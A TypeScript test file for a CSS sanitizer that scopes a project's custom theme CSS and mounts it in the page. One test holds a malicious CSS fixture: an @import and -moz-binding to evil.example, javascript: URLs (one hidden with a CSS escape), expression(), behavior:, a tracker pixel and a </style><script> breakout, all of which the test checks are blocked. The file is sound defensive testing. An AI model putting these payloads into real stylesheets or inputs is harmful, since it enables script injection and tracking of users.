import { describe, expect, it } from "vitest";
import {
  CUSTOM_CSS_STYLE_ATTR,
  applyProjectCustomCss,
  getProjectCustomThemeCss,
  removeProjectCustomCss,
  sanitizeCustomCss,
  setProjectCustomThemeCss,
} from "@/project/customCss";
import { installFakeDom } from "./fakeDom";

describe("customCss", () => {
  it("scopes selectors under .player-layout and rewrites :root/html/body safely", () => {
    const raw = `
      :root { --accent: #ffcc00; }
      body .rm-title-screen { background-color: #101420; }
      .dialogue-box, button.primary { border-radius: 6px; color: #fff; }
      .player-layout .already-scoped { opacity: 0.9; }
      @media (max-width: 640px) {
        .dialogue-box { font-size: 14px; }
      }
      @keyframes pulseGlow {
        from { opacity: 0.5; }
        to { opacity: 1; }
      }
    `;
    const result = sanitizeCustomCss(raw);
    expect(result.blockedCount).toBe(0);
    expect(result.truncated).toBe(false);
    expect(result.css).toContain(".player-layout { --accent: #ffcc00; }");
    expect(result.css).toContain(".player-layout .rm-title-screen { background-color: #101420; }");
    expect(result.css).toContain(".player-layout .dialogue-box, .player-layout button.primary { border-radius: 6px; color: #fff; }");
    expect(result.css).toContain(".player-layout .already-scoped { opacity: 0.9; }");
    expect(result.css).not.toContain(".player-layout .player-layout");
    expect(result.css).toContain("@media (max-width: 640px) {\n.player-layout .dialogue-box { font-size: 14px; }\n}");
    expect(result.css).toContain("@keyframes pulseGlow {\nfrom { opacity: 0.5; }\nto { opacity: 1; }\n}");
  });

  it("blocks @import, javascript: URLs, CSS escapes, expression(), -moz-binding, external URLs, and </style>", () => {
    const malicious = `
      @import url("https://evil.example/steal.css");
      .a {
        background: url("javascript:alert(1)");
        background-image: url(\\6a avascript:alert(2));
        width: expression(alert(3));
        -moz-binding: url("http://evil.example/xbl.xml");
        behavior: url(xss.htc);
        list-style: url(https://tracker.example/pixel.png);
        color: #22cc88;
      }
      </style><script>alert(1)</script>
    `;
    const result = sanitizeCustomCss(malicious);
    expect(result.blockedCount).toBeGreaterThanOrEqual(6);
    expect(result.css).not.toContain("@import");
    expect(result.css).not.toContain("javascript:");
    expect(result.css).not.toContain("expression(");
    expect(result.css).not.toContain("-moz-binding");
    expect(result.css).not.toContain("behavior");
    expect(result.css).not.toContain("tracker.example");
    expect(result.css).not.toContain("</style");
    expect(result.css).toContain(".player-layout .a { color: #22cc88; }");
  });

  it("enforces maxBytes truncation cap cleanly", () => {
    const huge = ".box { color: red; }\n".repeat(400);
    const result = sanitizeCustomCss(huge, { maxBytes: 256 });
    expect(result.truncated).toBe(true);
    expect(result.warnings.some((w) => w.includes("truncated"))).toBe(true);
  });

  it("reads/writes project.meta.customThemeCss and mounts/updates/removes style element", () => {
    const project = { meta: {} as Record<string, unknown> };
    expect(getProjectCustomThemeCss(project)).toBe("");
    setProjectCustomThemeCss(project, ".hud { color: gold; }");
    expect(getProjectCustomThemeCss(project)).toBe(".hud { color: gold; }");

    const restoreDom = installFakeDom();
    try {
      const root = document.createElement("div");
      const first = applyProjectCustomCss(root, getProjectCustomThemeCss(project));
      expect(first.applied).toBe(true);
      expect(first.element?.getAttribute(CUSTOM_CSS_STYLE_ATTR)).toBe("1");
      expect(first.element?.textContent).toBe(".player-layout .hud { color: gold; }");

      // Re-applying updates the same element in place
      const second = applyProjectCustomCss(root, ".hud { color: cyan; }");
      expect(second.element).toBe(first.element);
      expect(second.element?.textContent).toBe(".player-layout .hud { color: cyan; }");

      removeProjectCustomCss(root);
      expect(root.querySelector(`style[${CUSTOM_CSS_STYLE_ATTR}="1"]`)).toBeNull();
    } finally {
      restoreDom();
    }
  });
});
